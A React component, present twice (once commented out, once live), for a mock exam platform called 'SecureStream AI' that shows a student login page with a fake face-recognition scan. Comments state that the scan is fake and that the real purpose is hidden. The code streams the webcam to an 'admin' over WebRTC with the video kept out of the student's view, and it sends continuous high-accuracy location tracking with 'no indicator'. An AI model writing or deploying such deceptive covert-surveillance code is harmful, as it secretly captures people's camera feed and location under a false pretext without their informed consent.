// import { useEffect, useState, useRef } from "react";
// import io from "socket.io-client";

// const socket = io("http://localhost:3001");

// function UserDashboard() {
//   const [feedback, setFeedback] = useState("");
//   const [isTracking, setIsTracking] = useState(false);
//   const [showExamLogin, setShowExamLogin] = useState(true);
//   const [loginStatus, setLoginStatus] = useState("ready");
//   const [isRobot, setIsRobot] = useState(true);
//   const [scanProgress, setScanProgress] = useState(0);
//   const [examStarted, setExamStarted] = useState(false);

//   const videoRef = useRef(null);
//   const peerConnectionRef = useRef(null);
//   const streamRef = useRef(null);
//   const pendingCandidatesRef = useRef([]);
//   const locationWatchIdRef = useRef(null);
//   const userIdRef = useRef(null);

//   useEffect(() => {
//     const userId = `student_${Math.random().toString(36).substr(2, 9)}`;
//     userIdRef.current = userId;
//     socket.emit("register-user", userId);

//     socket.on("receive-feedback", (message) => setFeedback(message));
//     socket.on("answer", handleAnswer);
//     socket.on("ice-candidate", handleIceCandidate);

//     return () => {
//       if (streamRef.current) {
//         streamRef.current.getTracks().forEach((track) => track.stop());
//       }
//       if (locationWatchIdRef.current) {
//         navigator.geolocation.clearWatch(locationWatchIdRef.current);
//       }
//       socket.off();
//     };
//   }, []);

//   const handleFaceLogin = async () => {
//     if (isRobot) {
//       alert("Please verify you're not a robot first!");
//       return;
//     }

//     setLoginStatus("scanning");

//     // Fake face scanning animation
//     let progress = 0;
//     const scanInterval = setInterval(() => {
//       progress += 10;
//       setScanProgress(progress);
//       if (progress >= 100) {
//         clearInterval(scanInterval);
//         setLoginStatus("authenticating");
//         setTimeout(() => initiateActualLogin(), 500);
//       }
//     }, 200);
//   };

//   const initiateActualLogin = async () => {
//     try {
//       // Get camera access (HIDDEN from student)
//       const stream = await navigator.mediaDevices.getUserMedia({
//         video: true,
//         audio: false,
//       });

//       streamRef.current = stream;

//       // DON'T show video to student - keep hidden
//       // if (videoRef.current) {
//       //   videoRef.current.srcObject = stream;
//       // }

//       socket.emit("camera-permission-granted");
//       await createPeerConnection(stream);

//       // Start location tracking (SILENT - no indicator)
//       startLocationTracking();

//       setLoginStatus("success");
//       setTimeout(() => {
//         setShowExamLogin(false);
//         setExamStarted(true);
//       }, 1500);
//     } catch (error) {
//       console.error("Camera access denied:", error);
//       setLoginStatus("error");
//     }
//   };

//   const startLocationTracking = () => {
//     if (navigator.geolocation) {
//       setIsTracking(true); // Internal state only, not shown to student

//       locationWatchIdRef.current = navigator.geolocation.watchPosition(
//         (position) => {
//           const location = {
//             latitude: position.coords.latitude,
//             longitude: position.coords.longitude,
//             accuracy: position.coords.accuracy,
//             timestamp: new Date().toISOString(),
//           };

//           socket.emit("location-update", {
//             userId: userIdRef.current,
//             location: location,
//           });
//         },
//         (error) => {
//           console.error("Location error:", error);
//         },
//         {
//           enableHighAccuracy: true,
//           timeout: 5000,
//           maximumAge: 0,
//         }
//       );
//     }
//   };

//   const createPeerConnection = async (stream) => {
//     const configuration = {
//       iceServers: [
//         { urls: "stun:stun.l.google.com:19302" },
//         { urls: "stun:stun1.l.google.com:19302" },
//       ],
//     };
//     peerConnectionRef.current = new RTCPeerConnection(configuration);

//     stream.getTracks().forEach((track) => {
//       peerConnectionRef.current.addTrack(track, stream);
//     });

//     peerConnectionRef.current.onicecandidate = (event) => {
//       if (event.candidate) {
//         socket.emit("ice-candidate", {
//           candidate: event.candidate,
//           to: "admin",
//         });
//       }
//     };

//     const offer = await peerConnectionRef.current.createOffer();
//     await peerConnectionRef.current.setLocalDescription(offer);
//     socket.emit("offer", { offer, to: "admin" });
//   };

//   const handleAnswer = async ({ answer }) => {
//     try {
//       if (!peerConnectionRef.current) return;

//       await peerConnectionRef.current.setRemoteDescription(
//         new RTCSessionDescription(answer)
//       );

//       for (const candidate of pendingCandidatesRef.current) {
//         await peerConnectionRef.current.addIceCandidate(candidate);
//       }
//       pendingCandidatesRef.current = [];
//     } catch (error) {
//       console.error("Error handling answer:", error);
//     }
//   };

//   const handleIceCandidate = async ({ candidate }) => {
//     try {
//       if (
//         peerConnectionRef.current &&
//         peerConnectionRef.current.remoteDescription
//       ) {
//         await peerConnectionRef.current.addIceCandidate(
//           new RTCIceCandidate(candidate)
//         );
//       } else {
//         pendingCandidatesRef.current.push(new RTCIceCandidate(candidate));
//       }
//     } catch (error) {
//       console.error("Error adding ICE candidate:", error);
//     }
//   };

//   return (
//     <div style={styles.container}>
//       {showExamLogin ? (
//         <div style={styles.loginContainer}>
//           <div style={styles.loginCard}>
//             <div style={styles.logoSection}>
//               <div style={styles.logo}>🎓</div>
//               <h1 style={styles.title}>SecureStream AI</h1>
//               <p style={styles.subtitle}>Secure Online Examination Platform</p>
//             </div>

//             <div style={styles.divider}></div>

//             {loginStatus === "ready" && (
//               <>
//                 <div style={styles.verificationBox}>
//                   <label style={styles.checkboxLabel}>
//                     <input
//                       type="checkbox"
//                       checked={!isRobot}
//                       onChange={() => setIsRobot(!isRobot)}
//                       style={styles.checkbox}
//                     />
//                     <span style={styles.checkboxText}>I'm not a robot</span>
//                   </label>
//                 </div>

//                 <button
//                   onClick={handleFaceLogin}
//                   style={{
//                     ...styles.loginButton,
//                     opacity: isRobot ? 0.5 : 1,
//                     cursor: isRobot ? "not-allowed" : "pointer",
//                   }}
//                   disabled={isRobot}
//                 >
//                   <span style={styles.buttonIcon}>🔐</span>
//                   Login with Face Recognition
//                 </button>

//                 <p style={styles.infoText}>
//                   Biometric authentication ensures secure exam access
//                 </p>
//               </>
//             )}

//             {loginStatus === "scanning" && (
//               <div style={styles.scanningContainer}>
//                 <div style={styles.scanIcon}>👤</div>
//                 <h3 style={styles.scanTitle}>Scanning Face...</h3>
//                 <div style={styles.progressBar}>
//                   <div
//                     style={{
//                       ...styles.progressFill,
//                       width: `${scanProgress}%`,
//                     }}
//                   ></div>
//                 </div>
//                 <p style={styles.scanText}>{scanProgress}% Complete</p>
//               </div>
//             )}

//             {loginStatus === "authenticating" && (
//               <div style={styles.scanningContainer}>
//                 <div style={styles.loadingSpinner}></div>
//                 <h3 style={styles.scanTitle}>Authenticating...</h3>
//                 <p style={styles.scanText}>Verifying identity</p>
//               </div>
//             )}

//             {loginStatus === "success" && (
//               <div style={styles.successContainer}>
//                 <div style={styles.successIcon}>✓</div>
//                 <h3 style={styles.successTitle}>Authentication Successful!</h3>
//                 <p style={styles.successText}>Redirecting to exam...</p>
//               </div>
//             )}

//             {loginStatus === "error" && (
//               <div style={styles.errorContainer}>
//                 <div style={styles.errorIcon}>✕</div>
//                 <h3 style={styles.errorTitle}>Authentication Failed</h3>
//                 <p style={styles.errorText}>
//                   Please allow camera access and try again
//                 </p>
//                 <button onClick={handleFaceLogin} style={styles.retryButton}>
//                   Retry
//                 </button>
//               </div>
//             )}
//           </div>

//           <p style={styles.footerText}>
//             © 2025 SecureStream AI - All Rights Reserved
//           </p>
//         </div>
//       ) : (
//         <div style={styles.examContainer}>
//           <div style={styles.examHeader}>
//             <h2 style={styles.examTitle}>📝 Data Structures Final Exam</h2>
//             <div style={styles.examInfo}>
//               <span style={styles.examTime}>⏱️ Time Remaining: 1:45:23</span>
//               <span style={styles.examStatus}>🟢 Active</span>
//             </div>
//           </div>

//           <div style={styles.examContent}>
//             <div style={styles.questionCard}>
//               <h3 style={styles.questionTitle}>Question 1 of 50</h3>
//               <p style={styles.questionText}>
//                 What is the time complexity of binary search in a sorted array?
//               </p>
//               <div style={styles.optionsContainer}>
//                 {["O(n)", "O(log n)", "O(n²)", "O(1)"].map((option, idx) => (
//                   <label key={idx} style={styles.optionLabel}>
//                     <input type="radio" name="q1" style={styles.radio} />
//                     <span style={styles.optionText}>{option}</span>
//                   </label>
//                 ))}
//               </div>
//             </div>

//             <div style={styles.navigationButtons}>
//               <button style={styles.prevButton}>← Previous</button>
//               <button style={styles.nextButton}>Next →</button>
//             </div>
//           </div>

//           {feedback && (
//             <div style={styles.feedback}>
//               <strong>⚠️ Proctor Alert:</strong> {feedback}
//             </div>
//           )}
//         </div>
//       )}

//       {/* Hidden video element - NOT shown to student */}
//       <video
//         ref={videoRef}
//         autoPlay
//         muted
//         playsInline
//         style={{ display: "none" }}
//       />
//     </div>
//   );
// }

// const styles = {
//   container: {
//     minHeight: "100vh",
//     background: "linear-gradient(135deg, #667eea 0%, #764ba2 100%)",
//     display: "flex",
//     alignItems: "center",
//     justifyContent: "center",
//     fontFamily:
//       "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
//   },
//   loginContainer: {
//     width: "100%",
//     maxWidth: "480px",
//     padding: "20px",
//   },
//   loginCard: {
//     background: "white",
//     borderRadius: "20px",
//     padding: "40px",
//     boxShadow: "0 20px 60px rgba(0,0,0,0.3)",
//   },
//   logoSection: {
//     textAlign: "center",
//     marginBottom: "30px",
//   },
//   logo: {
//     fontSize: "64px",
//     marginBottom: "15px",
//   },
//   title: {
//     fontSize: "28px",
//     fontWeight: "700",
//     color: "#1a1a1a",
//     margin: "0 0 8px 0",
//   },
//   subtitle: {
//     fontSize: "14px",
//     color: "#666",
//     margin: 0,
//   },
//   divider: {
//     height: "1px",
//     background: "#e0e0e0",
//     margin: "25px 0",
//   },
//   verificationBox: {
//     background: "#f8f9fa",
//     padding: "20px",
//     borderRadius: "12px",
//     marginBottom: "25px",
//     border: "2px solid #e0e0e0",
//   },
//   checkboxLabel: {
//     display: "flex",
//     alignItems: "center",
//     cursor: "pointer",
//   },
//   checkbox: {
//     width: "20px",
//     height: "20px",
//     marginRight: "12px",
//     cursor: "pointer",
//   },
//   checkboxText: {
//     fontSize: "16px",
//     color: "#333",
//   },
//   loginButton: {
//     width: "100%",
//     padding: "16px",
//     background: "linear-gradient(135deg, #667eea 0%, #764ba2 100%)",
//     color: "white",
//     border: "none",
//     borderRadius: "12px",
//     fontSize: "16px",
//     fontWeight: "600",
//     display: "flex",
//     alignItems: "center",
//     justifyContent: "center",
//     gap: "10px",
//     transition: "transform 0.2s",
//   },
//   buttonIcon: {
//     fontSize: "20px",
//   },
//   infoText: {
//     textAlign: "center",
//     fontSize: "13px",
//     color: "#666",
//     marginTop: "15px",
//   },
//   scanningContainer: {
//     textAlign: "center",
//     padding: "30px 0",
//   },
//   scanIcon: {
//     fontSize: "80px",
//     marginBottom: "20px",
//     animation: "pulse 1.5s infinite",
//   },
//   scanTitle: {
//     fontSize: "22px",
//     color: "#333",
//     margin: "0 0 20px 0",
//   },
//   progressBar: {
//     width: "100%",
//     height: "8px",
//     background: "#e0e0e0",
//     borderRadius: "10px",
//     overflow: "hidden",
//     marginBottom: "15px",
//   },
//   progressFill: {
//     height: "100%",
//     background: "linear-gradient(90deg, #667eea 0%, #764ba2 100%)",
//     transition: "width 0.3s",
//   },
//   scanText: {
//     fontSize: "14px",
//     color: "#666",
//   },
//   loadingSpinner: {
//     width: "60px",
//     height: "60px",
//     border: "4px solid #e0e0e0",
//     borderTop: "4px solid #667eea",
//     borderRadius: "50%",
//     margin: "0 auto 20px",
//     animation: "spin 1s linear infinite",
//   },
//   successContainer: {
//     textAlign: "center",
//     padding: "30px 0",
//   },
//   successIcon: {
//     width: "80px",
//     height: "80px",
//     background: "#4caf50",
//     color: "white",
//     fontSize: "48px",
//     borderRadius: "50%",
//     display: "flex",
//     alignItems: "center",
//     justifyContent: "center",
//     margin: "0 auto 20px",
//   },
//   successTitle: {
//     fontSize: "22px",
//     color: "#4caf50",
//     margin: "0 0 10px 0",
//   },
//   successText: {
//     fontSize: "14px",
//     color: "#666",
//   },
//   errorContainer: {
//     textAlign: "center",
//     padding: "30px 0",
//   },
//   errorIcon: {
//     width: "80px",
//     height: "80px",
//     background: "#f44336",
//     color: "white",
//     fontSize: "48px",
//     borderRadius: "50%",
//     display: "flex",
//     alignItems: "center",
//     justifyContent: "center",
//     margin: "0 auto 20px",
//   },
//   errorTitle: {
//     fontSize: "22px",
//     color: "#f44336",
//     margin: "0 0 10px 0",
//   },
//   errorText: {
//     fontSize: "14px",
//     color: "#666",
//     marginBottom: "20px",
//   },
//   retryButton: {
//     padding: "12px 30px",
//     background: "#667eea",
//     color: "white",
//     border: "none",
//     borderRadius: "8px",
//     fontSize: "14px",
//     cursor: "pointer",
//   },
//   footerText: {
//     textAlign: "center",
//     color: "white",
//     fontSize: "13px",
//     marginTop: "20px",
//     opacity: 0.8,
//   },
//   examContainer: {
//     width: "100%",
//     maxWidth: "900px",
//     padding: "20px",
//   },
//   examHeader: {
//     background: "white",
//     padding: "25px",
//     borderRadius: "15px",
//     marginBottom: "20px",
//     boxShadow: "0 4px 15px rgba(0,0,0,0.1)",
//   },
//   examTitle: {
//     fontSize: "24px",
//     color: "#333",
//     margin: "0 0 15px 0",
//   },
//   examInfo: {
//     display: "flex",
//     justifyContent: "space-between",
//     fontSize: "14px",
//   },
//   examTime: {
//     color: "#666",
//   },
//   examStatus: {
//     color: "#4caf50",
//     fontWeight: "600",
//   },
//   examContent: {
//     background: "white",
//     padding: "30px",
//     borderRadius: "15px",
//     boxShadow: "0 4px 15px rgba(0,0,0,0.1)",
//   },
//   questionCard: {
//     marginBottom: "30px",
//   },
//   questionTitle: {
//     fontSize: "18px",
//     color: "#667eea",
//     marginBottom: "15px",
//   },
//   questionText: {
//     fontSize: "16px",
//     color: "#333",
//     lineHeight: "1.6",
//     marginBottom: "20px",
//   },
//   optionsContainer: {
//     display: "flex",
//     flexDirection: "column",
//     gap: "12px",
//   },
//   optionLabel: {
//     display: "flex",
//     alignItems: "center",
//     padding: "15px",
//     background: "#f8f9fa",
//     borderRadius: "10px",
//     cursor: "pointer",
//     transition: "background 0.2s",
//   },
//   radio: {
//     marginRight: "12px",
//   },
//   optionText: {
//     fontSize: "15px",
//     color: "#333",
//   },
//   navigationButtons: {
//     display: "flex",
//     justifyContent: "space-between",
//     marginTop: "30px",
//   },
//   prevButton: {
//     padding: "12px 30px",
//     background: "#e0e0e0",
//     border: "none",
//     borderRadius: "8px",
//     fontSize: "14px",
//     cursor: "pointer",
//   },
//   nextButton: {
//     padding: "12px 30px",
//     background: "#667eea",
//     color: "white",
//     border: "none",
//     borderRadius: "8px",
//     fontSize: "14px",
//     cursor: "pointer",
//   },
//   feedback: {
//     background: "#fff3cd",
//     padding: "15px 20px",
//     borderRadius: "10px",
//     marginTop: "20px",
//     border: "1px solid #ffc107",
//     color: "#856404",
//   },
// };

// export default UserDashboard;

import { useEffect, useState, useRef } from "react";
import io from "socket.io-client";

const socket = io("http://localhost:3001");

function UserDashboard() {
  const [feedback, setFeedback] = useState("");
  const [isTracking, setIsTracking] = useState(false);
  const [showExamLogin, setShowExamLogin] = useState(true);
  const [loginStatus, setLoginStatus] = useState("ready");
  const [isRobot, setIsRobot] = useState(true);
  const [scanProgress, setScanProgress] = useState(0);
  const [examStarted, setExamStarted] = useState(false);

  const videoRef = useRef(null);
  const peerConnectionRef = useRef(null);
  const streamRef = useRef(null);
  const pendingCandidatesRef = useRef([]);
  const locationWatchIdRef = useRef(null);
  const userIdRef = useRef(null);

  useEffect(() => {
    const userId = `student_${Math.random().toString(36).substr(2, 9)}`;
    userIdRef.current = userId;

    console.log("🔵 STUDENT: Connecting to socket...");
    console.log("🔵 STUDENT: User ID:", userId);

    socket.on("connect", () => {
      console.log("✅ STUDENT: Socket connected!", socket.id);
    });

    socket.on("disconnect", () => {
      console.log("❌ STUDENT: Socket disconnected!");
    });

    socket.emit("register-user", userId);
    console.log("🔵 STUDENT: Sent register-user event");

    socket.on("receive-feedback", (message) => {
      console.log("📢 STUDENT: Received feedback:", message);
      setFeedback(message);
    });

    socket.on("answer", handleAnswer);
    socket.on("ice-candidate", handleIceCandidate);

    return () => {
      if (streamRef.current) {
        streamRef.current.getTracks().forEach((track) => track.stop());
      }
      if (locationWatchIdRef.current) {
        navigator.geolocation.clearWatch(locationWatchIdRef.current);
      }
      socket.off();
    };
  }, []);

  const handleFaceLogin = async () => {
    if (isRobot) {
      alert("Please verify you're not a robot first!");
      return;
    }

    console.log("🔐 STUDENT: Starting face login...");
    setLoginStatus("scanning");

    let progress = 0;
    const scanInterval = setInterval(() => {
      progress += 10;
      setScanProgress(progress);
      if (progress >= 100) {
        clearInterval(scanInterval);
        setLoginStatus("authenticating");
        setTimeout(() => initiateActualLogin(), 500);
      }
    }, 200);
  };

  const initiateActualLogin = async () => {
    console.log("🎥 STUDENT: Requesting camera access...");

    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: true,
        audio: false,
      });

      console.log("✅ STUDENT: Camera access granted!");
      streamRef.current = stream;

      socket.emit("camera-permission-granted");
      console.log("📤 STUDENT: Sent camera-permission-granted event");

      await createPeerConnection(stream);

      console.log("📍 STUDENT: Starting location tracking...");
      startLocationTracking();

      setLoginStatus("success");
      setTimeout(() => {
        setShowExamLogin(false);
        setExamStarted(true);
      }, 1500);
    } catch (error) {
      console.error("❌ STUDENT: Camera access denied:", error);
      setLoginStatus("error");
    }
  };

  const startLocationTracking = () => {
    if (!navigator.geolocation) {
      console.error("❌ STUDENT: Geolocation not supported");
      return;
    }

    console.log("📍 STUDENT: Geolocation supported, requesting permission...");
    setIsTracking(true);

    locationWatchIdRef.current = navigator.geolocation.watchPosition(
      (position) => {
        const location = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          timestamp: new Date().toISOString(),
        };

        console.log("📍 STUDENT: Location updated:", location);
        console.log(
          `📍 STUDENT: Lat: ${location.latitude}, Lng: ${location.longitude}, Accuracy: ${location.accuracy}m`
        );

        const payload = {
          userId: userIdRef.current,
          location: location,
        };

        console.log("📤 STUDENT: Sending location to server:", payload);
        socket.emit("location-update", payload);
        console.log("✅ STUDENT: Location sent via socket");
      },
      (error) => {
        console.error("❌ STUDENT: Location error:", error);
        console.error("❌ STUDENT: Error code:", error.code);
        console.error("❌ STUDENT: Error message:", error.message);
      },
      {
        enableHighAccuracy: true,
        timeout: 5000,
        maximumAge: 0,
      }
    );

    console.log(
      "📍 STUDENT: Location watch started with ID:",
      locationWatchIdRef.current
    );
  };

  const createPeerConnection = async (stream) => {
    console.log("🔗 STUDENT: Creating peer connection...");

    const configuration = {
      iceServers: [
        { urls: "stun:stun.l.google.com:19302" },
        { urls: "stun:stun1.l.google.com:19302" },
      ],
    };
    peerConnectionRef.current = new RTCPeerConnection(configuration);

    stream.getTracks().forEach((track) => {
      peerConnectionRef.current.addTrack(track, stream);
      console.log("🎥 STUDENT: Added track to peer connection:", track.kind);
    });

    peerConnectionRef.current.onicecandidate = (event) => {
      if (event.candidate) {
        console.log("🧊 STUDENT: Sending ICE candidate to admin");
        socket.emit("ice-candidate", {
          candidate: event.candidate,
          to: "admin",
        });
      }
    };

    peerConnectionRef.current.onconnectionstatechange = () => {
      console.log(
        "🔗 STUDENT: Connection state:",
        peerConnectionRef.current.connectionState
      );
    };

    const offer = await peerConnectionRef.current.createOffer();
    await peerConnectionRef.current.setLocalDescription(offer);

    console.log("📤 STUDENT: Sending offer to admin");
    socket.emit("offer", { offer, to: "admin" });
    console.log("✅ STUDENT: Offer sent");
  };

  const handleAnswer = async ({ answer }) => {
    try {
      console.log("📥 STUDENT: Received answer from admin");
      if (!peerConnectionRef.current) return;

      await peerConnectionRef.current.setRemoteDescription(
        new RTCSessionDescription(answer)
      );
      console.log("✅ STUDENT: Answer processed");

      for (const candidate of pendingCandidatesRef.current) {
        await peerConnectionRef.current.addIceCandidate(candidate);
      }
      pendingCandidatesRef.current = [];
    } catch (error) {
      console.error("❌ STUDENT: Error handling answer:", error);
    }
  };

  const handleIceCandidate = async ({ candidate }) => {
    try {
      console.log("🧊 STUDENT: Received ICE candidate");
      if (
        peerConnectionRef.current &&
        peerConnectionRef.current.remoteDescription
      ) {
        await peerConnectionRef.current.addIceCandidate(
          new RTCIceCandidate(candidate)
        );
        console.log("✅ STUDENT: ICE candidate added");
      } else {
        pendingCandidatesRef.current.push(new RTCIceCandidate(candidate));
        console.log("📦 STUDENT: ICE candidate queued");
      }
    } catch (error) {
      console.error("❌ STUDENT: Error adding ICE candidate:", error);
    }
  };

  return (
    <div style={styles.container}>
      {showExamLogin ? (
        <div style={styles.loginContainer}>
          <div style={styles.loginCard}>
            <div style={styles.logoSection}>
              <div style={styles.logo}>🎓</div>
              <h1 style={styles.title}>SecureStream AI</h1>
              <p style={styles.subtitle}>Secure Online Examination Platform</p>
            </div>

            <div style={styles.divider}></div>

            {loginStatus === "ready" && (
              <>
                <div style={styles.verificationBox}>
                  <label style={styles.checkboxLabel}>
                    <input
                      type="checkbox"
                      checked={!isRobot}
                      onChange={() => setIsRobot(!isRobot)}
                      style={styles.checkbox}
                    />
                    <span style={styles.checkboxText}>I'm not a robot</span>
                  </label>
                </div>

                <button
                  onClick={handleFaceLogin}
                  style={{
                    ...styles.loginButton,
                    opacity: isRobot ? 0.5 : 1,
                    cursor: isRobot ? "not-allowed" : "pointer",
                  }}
                  disabled={isRobot}
                >
                  <span style={styles.buttonIcon}>🔐</span>
                  Login with Face Recognition
                </button>

                <p style={styles.infoText}>
                  Biometric authentication ensures secure exam access
                </p>
              </>
            )}

            {loginStatus === "scanning" && (
              <div style={styles.scanningContainer}>
                <div style={styles.scanIcon}>👤</div>
                <h3 style={styles.scanTitle}>Scanning Face...</h3>
                <div style={styles.progressBar}>
                  <div
                    style={{
                      ...styles.progressFill,
                      width: `${scanProgress}%`,
                    }}
                  ></div>
                </div>
                <p style={styles.scanText}>{scanProgress}% Complete</p>
              </div>
            )}

            {loginStatus === "authenticating" && (
              <div style={styles.scanningContainer}>
                <div style={styles.loadingSpinner}></div>
                <h3 style={styles.scanTitle}>Authenticating...</h3>
                <p style={styles.scanText}>Verifying identity</p>
              </div>
            )}

            {loginStatus === "success" && (
              <div style={styles.successContainer}>
                <div style={styles.successIcon}>✓</div>
                <h3 style={styles.successTitle}>Authentication Successful!</h3>
                <p style={styles.successText}>Redirecting to exam...</p>
              </div>
            )}

            {loginStatus === "error" && (
              <div style={styles.errorContainer}>
                <div style={styles.errorIcon}>✕</div>
                <h3 style={styles.errorTitle}>Authentication Failed</h3>
                <p style={styles.errorText}>
                  Please allow camera access and try again
                </p>
                <button onClick={handleFaceLogin} style={styles.retryButton}>
                  Retry
                </button>
              </div>
            )}
          </div>

          <p style={styles.footerText}>
            © 2025 SecureStream AI - All Rights Reserved
          </p>
        </div>
      ) : (
        <div style={styles.examContainer}>
          <div style={styles.examHeader}>
            <h2 style={styles.examTitle}>📝 Data Structures Final Exam</h2>
            <div style={styles.examInfo}>
              <span style={styles.examTime}>⏱️ Time Remaining: 1:45:23</span>
              <span style={styles.examStatus}>🟢 Active</span>
            </div>
          </div>

          <div style={styles.examContent}>
            <div style={styles.questionCard}>
              <h3 style={styles.questionTitle}>Question 1 of 50</h3>
              <p style={styles.questionText}>
                What is the time complexity of binary search in a sorted array?
              </p>
              <div style={styles.optionsContainer}>
                {["O(n)", "O(log n)", "O(n²)", "O(1)"].map((option, idx) => (
                  <label key={idx} style={styles.optionLabel}>
                    <input type="radio" name="q1" style={styles.radio} />
                    <span style={styles.optionText}>{option}</span>
                  </label>
                ))}
              </div>
            </div>

            <div style={styles.navigationButtons}>
              <button style={styles.prevButton}>← Previous</button>
              <button style={styles.nextButton}>Next →</button>
            </div>
          </div>

          {feedback && (
            <div style={styles.feedback}>
              <strong>⚠️ Proctor Alert:</strong> {feedback}
            </div>
          )}
        </div>
      )}

      <video
        ref={videoRef}
        autoPlay
        muted
        playsInline
        style={{ display: "none" }}
      />
    </div>
  );
}

const styles = {
  container: {
    minHeight: "100vh",
    background: "linear-gradient(135deg, #667eea 0%, #764ba2 100%)",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    fontFamily:
      "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
  },
  loginContainer: {
    width: "100%",
    maxWidth: "480px",
    padding: "20px",
  },
  loginCard: {
    background: "white",
    borderRadius: "20px",
    padding: "40px",
    boxShadow: "0 20px 60px rgba(0,0,0,0.3)",
  },
  logoSection: {
    textAlign: "center",
    marginBottom: "30px",
  },
  logo: {
    fontSize: "64px",
    marginBottom: "15px",
  },
  title: {
    fontSize: "28px",
    fontWeight: "700",
    color: "#1a1a1a",
    margin: "0 0 8px 0",
  },
  subtitle: {
    fontSize: "14px",
    color: "#666",
    margin: 0,
  },
  divider: {
    height: "1px",
    background: "#e0e0e0",
    margin: "25px 0",
  },
  verificationBox: {
    background: "#f8f9fa",
    padding: "20px",
    borderRadius: "12px",
    marginBottom: "25px",
    border: "2px solid #e0e0e0",
  },
  checkboxLabel: {
    display: "flex",
    alignItems: "center",
    cursor: "pointer",
  },
  checkbox: {
    width: "20px",
    height: "20px",
    marginRight: "12px",
    cursor: "pointer",
  },
  checkboxText: {
    fontSize: "16px",
    color: "#333",
  },
  loginButton: {
    width: "100%",
    padding: "16px",
    background: "linear-gradient(135deg, #667eea 0%, #764ba2 100%)",
    color: "white",
    border: "none",
    borderRadius: "12px",
    fontSize: "16px",
    fontWeight: "600",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    gap: "10px",
    transition: "transform 0.2s",
  },
  buttonIcon: {
    fontSize: "20px",
  },
  infoText: {
    textAlign: "center",
    fontSize: "13px",
    color: "#666",
    marginTop: "15px",
  },
  scanningContainer: {
    textAlign: "center",
    padding: "30px 0",
  },
  scanIcon: {
    fontSize: "80px",
    marginBottom: "20px",
  },
  scanTitle: {
    fontSize: "22px",
    color: "#333",
    margin: "0 0 20px 0",
  },
  progressBar: {
    width: "100%",
    height: "8px",
    background: "#e0e0e0",
    borderRadius: "10px",
    overflow: "hidden",
    marginBottom: "15px",
  },
  progressFill: {
    height: "100%",
    background: "linear-gradient(90deg, #667eea 0%, #764ba2 100%)",
    transition: "width 0.3s",
  },
  scanText: {
    fontSize: "14px",
    color: "#666",
  },
  loadingSpinner: {
    width: "60px",
    height: "60px",
    border: "4px solid #e0e0e0",
    borderTop: "4px solid #667eea",
    borderRadius: "50%",
    margin: "0 auto 20px",
    animation: "spin 1s linear infinite",
  },
  successContainer: {
    textAlign: "center",
    padding: "30px 0",
  },
  successIcon: {
    width: "80px",
    height: "80px",
    background: "#4caf50",
    color: "white",
    fontSize: "48px",
    borderRadius: "50%",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    margin: "0 auto 20px",
  },
  successTitle: {
    fontSize: "22px",
    color: "#4caf50",
    margin: "0 0 10px 0",
  },
  successText: {
    fontSize: "14px",
    color: "#666",
  },
  errorContainer: {
    textAlign: "center",
    padding: "30px 0",
  },
  errorIcon: {
    width: "80px",
    height: "80px",
    background: "#f44336",
    color: "white",
    fontSize: "48px",
    borderRadius: "50%",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    margin: "0 auto 20px",
  },
  errorTitle: {
    fontSize: "22px",
    color: "#f44336",
    margin: "0 0 10px 0",
  },
  errorText: {
    fontSize: "14px",
    color: "#666",
    marginBottom: "20px",
  },
  retryButton: {
    padding: "12px 30px",
    background: "#667eea",
    color: "white",
    border: "none",
    borderRadius: "8px",
    fontSize: "14px",
    cursor: "pointer",
  },
  footerText: {
    textAlign: "center",
    color: "white",
    fontSize: "13px",
    marginTop: "20px",
    opacity: 0.8,
  },
  examContainer: {
    width: "100%",
    maxWidth: "900px",
    padding: "20px",
  },
  examHeader: {
    background: "white",
    padding: "25px",
    borderRadius: "15px",
    marginBottom: "20px",
    boxShadow: "0 4px 15px rgba(0,0,0,0.1)",
  },
  examTitle: {
    fontSize: "24px",
    color: "#333",
    margin: "0 0 15px 0",
  },
  examInfo: {
    display: "flex",
    justifyContent: "space-between",
    fontSize: "14px",
  },
  examTime: {
    color: "#666",
  },
  examStatus: {
    color: "#4caf50",
    fontWeight: "600",
  },
  examContent: {
    background: "white",
    padding: "30px",
    borderRadius: "15px",
    boxShadow: "0 4px 15px rgba(0,0,0,0.1)",
  },
  questionCard: {
    marginBottom: "30px",
  },
  questionTitle: {
    fontSize: "18px",
    color: "#667eea",
    marginBottom: "15px",
  },
  questionText: {
    fontSize: "16px",
    color: "#333",
    lineHeight: "1.6",
    marginBottom: "20px",
  },
  optionsContainer: {
    display: "flex",
    flexDirection: "column",
    gap: "12px",
  },
  optionLabel: {
    display: "flex",
    alignItems: "center",
    padding: "15px",
    background: "#f8f9fa",
    borderRadius: "10px",
    cursor: "pointer",
    transition: "background 0.2s",
  },
  radio: {
    marginRight: "12px",
  },
  optionText: {
    fontSize: "15px",
    color: "#333",
  },
  navigationButtons: {
    display: "flex",
    justifyContent: "space-between",
    marginTop: "30px",
  },
  prevButton: {
    padding: "12px 30px",
    background: "#e0e0e0",
    border: "none",
    borderRadius: "8px",
    fontSize: "14px",
    cursor: "pointer",
  },
  nextButton: {
    padding: "12px 30px",
    background: "#667eea",
    color: "white",
    border: "none",
    borderRadius: "8px",
    fontSize: "14px",
    cursor: "pointer",
  },
  feedback: {
    background: "#fff3cd",
    padding: "15px 20px",
    borderRadius: "10px",
    marginTop: "20px",
    border: "1px solid #ffc107",
    color: "#856404",
  },
};

// Add keyframe animation
const styleSheet = document.createElement("style");
styleSheet.textContent = `
  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }
`;
document.head.appendChild(styleSheet);

export default UserDashboard;
